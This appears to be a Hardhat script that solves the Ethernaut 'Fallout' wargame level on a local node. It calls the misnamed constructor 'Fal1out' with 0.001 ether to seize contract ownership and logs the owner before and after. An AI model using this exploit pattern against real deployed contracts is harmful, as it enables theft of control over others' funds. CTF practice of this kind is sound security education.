import { ethers } from "hardhat";

//Fit player address chosen from hardhat node addresses and contract address (current lvl instance)
const PLAYER_ADDRESS = "0x9965507D1a55bcC2695C58ba16FB37d819B0A4dc";
const CONTRACT_ADDRESS = "0x75537828f2ce51be7289709686A69CbFDbB714F1";

async function main() {
const signer = await ethers.getSigner(PLAYER_ADDRESS);
const contract = await ethers.getContractAt("Fallout",CONTRACT_ADDRESS,signer);

//HACK STEPS

// 1. Check current ownership
console.log("Current owner is: ", await contract.owner());

// 2. Initialise owner, function had a naming mistake so the function did not work as constructor
await contract.Fal1out({
    value: ethers.utils.parseEther("0.001")
});

// 3. Check ownership again
console.log("Now, updated owner is: ", await contract.owner());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
